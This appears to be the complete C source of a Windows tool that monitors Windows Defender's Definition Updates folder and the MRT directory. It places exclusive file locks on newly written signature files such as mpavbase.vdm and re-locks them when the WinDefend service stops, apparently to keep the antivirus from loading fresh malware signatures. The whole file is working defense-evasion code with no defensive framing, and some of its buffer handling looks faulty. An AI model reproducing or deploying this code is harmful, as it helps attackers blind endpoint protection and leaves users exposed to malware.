#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>
#pragma comment(lib,"ntdll.lib")

HANDLE* hdls = NULL;
CRITICAL_SECTION* lk;
wchar_t bk1[MAX_PATH] = { 0 };
wchar_t bk2[MAX_PATH] = { 0 };

struct Thd {
	wchar_t* upd;
	wchar_t* tgt;
};

void AddHd(HANDLE h) {
	static unsigned int cnt = 0;
	EnterCriticalSection(lk);
	HANDLE* nhd = (HANDLE*)malloc((++cnt + 1) * sizeof(HANDLE));
	if (hdls) memmove(nhd, hdls, cnt * sizeof(HANDLE));
	nhd[cnt - 1] = h;
	nhd[cnt] = NULL;
	if (hdls) free(hdls);
	hdls = nhd;
	LeaveCriticalSection(lk);
}

void TryLk() {
	static HANDLE h1 = NULL;
	static HANDLE h2 = NULL;
	if (h1 && h2) return;
	UNICODE_STRING us = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	RtlInitUnicodeString(&us, bk1);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iob = { 0 };
	if (!h1)
		NtCreateFile(&h1, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &oa, &iob, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
	RtlInitUnicodeString(&us, bk2);
	if (!h2)
		NtCreateFile(&h2, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &oa, &iob, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
	if (h1) {
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(h1, &li);
		OVERLAPPED ov = { 0 };
		LockFileEx(h1, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
		AddHd(h1);
	}
	if (h2) {
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(h2, &li);
		OVERLAPPED ov = { 0 };
		LockFileEx(h2, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
		AddHd(h2);
	}
}

DWORD WINAPI UpdTh(Thd* a) {
	wchar_t fp[MAX_PATH] = { 0 };
	wchar_t _fp[MAX_PATH] = { 0 };
	wcscpy(fp, a->upd);
	wcscat(fp, L"\\");
	wcscat(fp, a->tgt);
	free(a->tgt);
	delete a;
	HANDLE h = NULL;
	UNICODE_STRING us = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	NTSTATUS s = STATUS_SUCCESS;
	IO_STATUS_BLOCK iob = { 0 };
	wcscpy(_fp, L"\\??\\");
	wcscat(_fp, fp);
	RtlInitUnicodeString(&us, _fp);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	do {
		s = NtCreateFile(&h, GENERIC_READ | SYNCHRONIZE, &oa, &iob, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
		if (s == STATUS_NOT_FOUND || s == STATUS_OBJECT_NAME_NOT_FOUND || s == STATUS_OBJECT_PATH_NOT_FOUND)
			return s;
	} while (s);
	LARGE_INTEGER li = { 0 };
	GetFileSizeEx(h, &li);
	LARGE_INTEGER of = { 0, 0 };
	LockFile(h, of.LowPart, of.HighPart, li.LowPart, li.HighPart);
	AddHd(h);
	return ERROR_SUCCESS;
}

VOID WDCb(IN PVOID p) {
	PSERVICE_NOTIFY ps = (PSERVICE_NOTIFY)p;
	SC_HANDLE hs = (SC_HANDLE)ps->pContext;
	DWORD req = 0;
	QueryServiceConfig(hs, NULL, NULL, &req);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return;
	LPQUERY_SERVICE_CONFIG sc = (LPQUERY_SERVICE_CONFIG)malloc(req);
	if (!QueryServiceConfig(hs, sc, req, &req)) return;
	sc->lpBinaryPathName[strlen(sc->lpBinaryPathName) - 1] = 0;
	HKEY wk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates", 0, KEY_READ, &wk) || !wk)
		return;
	wchar_t sp[MAX_PATH] = { 0 };
	DWORD rz = sizeof(sp);
	DWORD rc = RegQueryValueExW(wk, L"SignatureLocation", NULL, NULL, (LPBYTE)sp, &rz);
	RegCloseKey(wk);
	if (rc) return;
	wcscat(sp, L"\\mpavbase.vdm");
	wchar_t _sp[MAX_PATH] = { 0 };
	wcscpy(_sp, L"\\??\\");
	wcscat(_sp, sp);
	UNICODE_STRING us = { 0 };
	RtlInitUnicodeString(&us, _sp);
	OBJECT_ATTRIBUTES oa = { 0 };
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iob = { 0 };
	HANDLE h = NULL;
	NTSTATUS ns = STATUS_SUCCESS;
	ns = NtCreateFile(&h, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &oa, &iob, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
	if (ns) return;
	LARGE_INTEGER li = { 0 };
	GetFileSizeEx(h, &li);
	OVERLAPPED ov = { 0 };
	LockFileEx(h, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
	free(sc);
	AddHd(h);
}

DWORD WINAPI WDTh(void*) {
	SC_HANDLE hs = NULL;
	SC_HANDLE sm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!sm) return 1;
	hs = OpenServiceW(sm, L"WinDefend", SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
	CloseServiceHandle(sm);
	if (!hs) return 1;
	SERVICE_STATUS ss = { 0 };
	if (!QueryServiceStatus(hs, &ss) || ss.dwCurrentState != SERVICE_RUNNING) {
		CloseHandle(hs);
		ExitProcess(ERROR_SUCCESS);
	}
	while (1) {
		SERVICE_NOTIFY_2W sn = { 0 };
		sn.dwVersion = SERVICE_NOTIFY_STATUS_CHANGE;
		sn.pfnNotifyCallback = WDCb;
		sn.pContext = hs;
		if (NotifyServiceStatusChangeW(hs, SERVICE_NOTIFY_STOPPED, &sn)) {
			CloseHandle(hs);
			return 1;
		}
		SleepEx(INFINITE, TRUE);
	}
	CloseHandle(hs);
	return 0;
}

DWORD WINAPI MRTTh(void*) {
	wchar_t _upd[] = { L"\\??\\C:\\Windows\\System32\\MRT" };
	UNICODE_STRING us = { 0 };
	RtlInitUnicodeString(&us, _upd);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK iob = { 0 };
	HANDLE hm = NULL;
	DWORD rb = 0;
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS s = STATUS_SUCCESS;
	do {
		Sleep(10);
		s = NtCreateFile(&hm, FILE_READ_DATA | SYNCHRONIZE, &oa, &iob, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);
	} while (s == STATUS_OBJECT_NAME_NOT_FOUND);
	if (s || !hm) return 1;
	char nd[0x1000] = { 0 };
	do {
		if (!ReadDirectoryChangesW(hm, nd, sizeof(nd), TRUE, FILE_NOTIFY_CHANGE_SIZE, &rb, NULL, NULL))
			return 1;
		FILE_NOTIFY_INFORMATION* fn = (FILE_NOTIFY_INFORMATION*)nd;
		if (fn->Action != FILE_ACTION_MODIFIED) continue;
		Thd* ta = new Thd;
		ta->upd = &_upd[4];
		fn->FileName[fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
		wchar_t* t = (wchar_t*)malloc(fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
		ZeroMemory(t, sizeof(fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
		wcscpy(t, fn->FileName);
		ta->tgt = t;
		DWORD ti = 0;
		HANDLE ht = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdTh, ta, NULL, &ti);
	} while (1);
	return ERROR_SUCCESS;
}

int wmain() {
	DWORD ti2 = 0;
	wchar_t ud[MAX_PATH] = { 0 };
	HKEY wk = NULL;
	wchar_t wp[MAX_PATH] = { 0 };
	wchar_t wu[MAX_PATH] = { 0 };
	wchar_t _wu[MAX_PATH] = { 0 };
	DWORD rz = sizeof(wp);
	DWORD rb = 0;
	DWORD rc = 0;
	HANDLE hm = NULL;
	NTSTATUS s = STATUS_SUCCESS;
	UNICODE_STRING us = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK iob = { 0 };
	lk = new CRITICAL_SECTION;
	InitializeCriticalSection(lk);
	HANDLE wk2 = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_READ, &wk) || !wk)
		return 1;
	rc = RegQueryValueExW(wk, L"ProductAppDataPath", NULL, NULL, (LPBYTE)wp, &rz);
	RegCloseKey(wk);
	wk = NULL;
	if (rc) return 1;
	wcscpy(wu, wp);
	wcscat(wu, L"\\Definition Updates");
	wcscpy(_wu, L"\\??\\");
	wcscat(_wu, wu);
	wcscpy(bk1, _wu);
	wcscpy(bk2, _wu);
	wcscat(bk1, L"\\Backup\\mpavbase.lkg");
	wcscat(bk2, L"\\Backup\\mpavbase.vdm");
	TryLk();
	wk2 = CreateThread(NULL, NULL, WDTh, NULL, NULL, &ti2);
	HANDLE mh = CreateThread(NULL, NULL, MRTTh, NULL, NULL, &ti2);
	RtlInitUnicodeString(&us, _wu);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	s = NtCreateFile(&hm, FILE_READ_DATA | SYNCHRONIZE, &oa, &iob, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);
	if (s || !hm) return 1;
	char nd[0x1000] = { 0 };
	do {
		if (!ReadDirectoryChangesW(hm, nd, sizeof(nd), TRUE, FILE_NOTIFY_CHANGE_SIZE, &rb, NULL, NULL))
			return 1;
		FILE_NOTIFY_INFORMATION* fn = (FILE_NOTIFY_INFORMATION*)nd;
		if (fn->Action != FILE_ACTION_MODIFIED) continue;
		Thd* ta = new Thd;
		ta->upd = wu;
		fn->FileName[fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
		wchar_t* t = (wchar_t*)malloc(fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
		ZeroMemory(t, sizeof(fn->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
		wcscpy(t, fn->FileName);
		ta->tgt = t;
		DWORD ti = 0;
		HANDLE ht = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdTh, ta, NULL, &ti);
	} while (1);
	CloseHandle(hm);
	return 0;
}
